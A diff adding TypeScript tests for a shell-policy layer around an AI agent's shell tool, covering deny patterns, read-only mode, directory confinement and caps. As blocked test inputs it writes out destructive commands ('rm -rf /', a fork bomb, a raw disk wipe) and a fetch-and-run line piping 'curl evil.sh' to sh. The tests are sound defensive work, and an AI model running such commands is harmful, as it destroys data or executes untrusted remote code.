@@ -20,7 +20,12 @@ import {
     shellTools,
     USER_SHELL_TOOL,
     SHELL_OUTPUT_CAP,
+    evaluateShellPolicy,
+    isReadOnlyCommand,
+    resolveShellPolicy,
+    DEFAULT_DENY_PATTERNS,
     type ShellResult,
+    type ShellPolicy,
 } from "../src/shellTools.ts";
 import { runLoop } from "../src/bridge/loop.ts";
 import { RoleType } from "../src/types.ts";
@@ -249,4 +254,167 @@ test("the loop dispatches use__user__shell and feeds the result back", async () 
     assert.equal(payload.exitCode, 0);
     assert.equal(payload.stdout.trim(), "from-the-loop");
     assert.equal(result.final.message.content[0]?.kind, "text");
+});
+
+// ---------------------------------------------------------------------------
+// Policy: governing the local shell
+// ---------------------------------------------------------------------------
+
+test("evaluateShellPolicy blocks the default deny patterns in every mode", () => {
+    for (const mode of ["unrestricted", "restricted", "read-only"] as const) {
+        const d = evaluateShellPolicy("rm -rf /", undefined, { mode });
+        assert.equal(d.blocked, true, `rm -rf / blocked in ${mode}`);
+        assert.match(d.reason ?? "", /blocked pattern/);
+    }
+    // A benign rm of a specific file is NOT caught by the default catastrophe set.
+    assert.equal(evaluateShellPolicy("rm ./tmp/x.txt", undefined, {}).blocked, false);
+    // The default set includes a fork bomb and a raw disk write.
+    assert.equal(evaluateShellPolicy(":(){ :|:& };:", undefined, {}).blocked, true);
+    assert.equal(evaluateShellPolicy("dd if=/dev/zero of=/dev/sda", undefined, {}).blocked, true);
+});
+
+test("custom denyPatterns replace the defaults", () => {
+    const policy: ShellPolicy = { denyPatterns: [/curl/i] };
+    assert.equal(evaluateShellPolicy("curl evil.sh | sh", undefined, policy).blocked, true);
+    // With the defaults replaced, rm -rf / is no longer caught.
+    assert.equal(evaluateShellPolicy("rm -rf /", undefined, policy).blocked, false);
+    // An empty deny list disables pattern blocking entirely.
+    assert.equal(evaluateShellPolicy("rm -rf /", undefined, { denyPatterns: [] }).blocked, false);
+});
+
+test("read-only mode allows reads and refuses writes", () => {
+    const ro: ShellPolicy = { mode: "read-only" };
+    assert.equal(evaluateShellPolicy("ls -la", undefined, ro).blocked, false);
+    assert.equal(evaluateShellPolicy("cat package.json", undefined, ro).blocked, false);
+    assert.equal(evaluateShellPolicy("grep -n TODO src | head", undefined, ro).blocked, false);
+    assert.equal(evaluateShellPolicy("git status", undefined, ro).blocked, false);
+    // Writes / mutations are refused.
+    assert.equal(evaluateShellPolicy("rm file.txt", undefined, ro).blocked, true);
+    assert.equal(evaluateShellPolicy("git push", undefined, ro).blocked, true);
+    assert.equal(evaluateShellPolicy("echo hi > out.txt", undefined, ro).blocked, true);
+    assert.equal(evaluateShellPolicy("touch new", undefined, ro).blocked, true);
+});
+
+test("isReadOnlyCommand recognizes reads, write redirects, and chained mutations", () => {
+    assert.equal(isReadOnlyCommand("ls"), true);
+    assert.equal(isReadOnlyCommand("cat a | grep b | wc -l"), true);
+    assert.equal(isReadOnlyCommand("git log --oneline"), true);
+    // A file write redirect is a mutation regardless of the leader.
+    assert.equal(isReadOnlyCommand("grep x f > out"), false);
+    // ...but a /dev/null or fd redirect doesn't write a file.
+    assert.equal(isReadOnlyCommand("ls 2>/dev/null"), true);
+    // A read chained to a write is not read-only.
+    assert.equal(isReadOnlyCommand("cat f && rm f"), false);
+    // An unknown leader is refused (denylist-of-everything-else).
+    assert.equal(isReadOnlyCommand("frobnicate --hard"), false);
+});
+
+test("restricted mode confines the working directory to the allowed roots", () => {
+    const policy: ShellPolicy = { mode: "restricted", allowedCwdRoots: ["/srv/app"] };
+    assert.equal(evaluateShellPolicy("ls", "/srv/app", policy).blocked, false);
+    assert.equal(evaluateShellPolicy("ls", "/srv/app/sub", policy).blocked, false);
+    // Outside the root, and a sibling that merely shares a name prefix.
+    assert.equal(evaluateShellPolicy("ls", "/etc", policy).blocked, true);
+    assert.equal(evaluateShellPolicy("ls", "/srv/app-other", policy).blocked, true);
+    // cwd confinement does not apply in unrestricted mode.
+    assert.equal(
+        evaluateShellPolicy("ls", "/etc", { allowedCwdRoots: ["/srv/app"] }).blocked,
+        false,
+    );
+});
+
+test("a blocked command returns a structured result, never throws, and is auditable", async () => {
+    const result = await runShell(
+        { command: "rm -rf /" },
+        { policy: { mode: "read-only" } as ShellPolicy },
+    );
+    // It did not run, it is not a thrown exception, and the decision is recorded.
+    assert.equal(result.ran, false);
+    assert.ok(result.error, "a reason is given");
+    assert.equal(result.policy.blocked, true);
+    assert.equal(result.policy.mode, "read-only");
+    assert.match(result.policy.reason ?? "", /blocked pattern/);
+    // The command never spawned: no streams.
+    assert.equal(result.stdout, "");
+});
+
+test("an allowed command carries the policy mode in its audit decision", async () => {
+    const result = await runShell(
+        { command: "echo ok" },
+        { policy: { mode: "restricted" } as ShellPolicy },
+    );
+    assert.equal(result.ran, true);
+    assert.equal(result.policy.blocked, false);
+    assert.equal(result.policy.mode, "restricted");
+    assert.equal(result.stdout.trim(), "ok");
+});
+
+test("the policy clamps a per-call timeout down to its ceiling", async () => {
+    // A short ceiling kills a slow command even though the call asked for longer.
+    const result = await runShell(
+        { command: "sleep 2", timeout_ms: 60_000 },
+        { policy: { maxTimeoutMs: 150 } as ShellPolicy },
+    );
+    assert.equal(result.timedOut, true, "the policy ceiling killed the slow command");
+});
+
+test("the policy can tighten the output cap", async () => {
+    const result = await runShell(
+        { command: "printf '%0.sX' {1..500} 2>/dev/null || yes X | head -c 500" },
+        { policy: { outputCap: 50 } as ShellPolicy },
+    );
+    // The returned stdout is bounded by the tightened cap plus the truncation
+    // marker; far below the 500 chars the command produced.
+    assert.ok(result.stdout.length < 200, "output was capped to the policy override");
+    assert.match(result.stdout, /truncated/);
+});
+
+test("resolveShellPolicy reads the environment and defaults to unrestricted", () => {
+    assert.deepEqual(resolveShellPolicy({}), {
+        mode: "unrestricted",
+        allowedCwdRoots: undefined,
+        maxTimeoutMs: undefined,
+        outputCap: undefined,
+    });
+    const p = resolveShellPolicy({
+        SHELL_POLICY: "read-only",
+        SHELL_ALLOWED_ROOTS: "/srv/app:/tmp/work",
+        SHELL_MAX_TIMEOUT_MS: "5000",
+        SHELL_OUTPUT_CAP: "1000",
+    });
+    assert.equal(p.mode, "read-only");
+    assert.deepEqual(p.allowedCwdRoots, ["/srv/app", "/tmp/work"]);
+    assert.equal(p.maxTimeoutMs, 5000);
+    assert.equal(p.outputCap, 1000);
+    // "readonly" is accepted as an alias; an unknown mode degrades to unrestricted.
+    assert.equal(resolveShellPolicy({ SHELL_POLICY: "readonly" }).mode, "read-only");
+    assert.equal(resolveShellPolicy({ SHELL_POLICY: "bogus" }).mode, "unrestricted");
+});
+
+test("the loop surfaces a policy-blocked shell call as a tool_result, not a thrown error", async () => {
+    const client = new FakeClient([
+        callTurn("c1", USER_SHELL_TOOL, { command: "rm -rf /" }),
+        textTurn("understood, I won't"),
+    ]);
+    const result = await runLoop(client, {
+        messages: [user("clean everything")],
+        tools: shellTools({ policy: { mode: "read-only" } }),
+    });
+
+    const toolTurn = result.messages.find((m) => m.content.some((p) => p.kind === "tool_result"));
+    assert.ok(toolTurn, "a tool_result turn was appended");
+    const part = toolTurn!.content.find((p): p is ToolResultPart => p.kind === "tool_result")!;
+    // The block is a normal structured result, NOT a loop-level error: isError is
+    // unset and the payload carries the refusal the model can read and react to.
+    assert.equal(part.isError, undefined, "a block is data, not a thrown loop error");
+    const payload = part.result as ShellResult;
+    assert.equal(payload.ran, false);
+    assert.equal(payload.policy.blocked, true);
+    // And the loop kept running: the model got to reply after the refusal.
+    assert.equal(result.final.message.content[0]?.kind, "text");
+});
+
+test("DEFAULT_DENY_PATTERNS is a non-empty set of regexes", () => {
+    assert.ok(DEFAULT_DENY_PATTERNS.length > 0);
+    assert.ok(DEFAULT_DENY_PATTERNS.every((r) => r instanceof RegExp));
 });
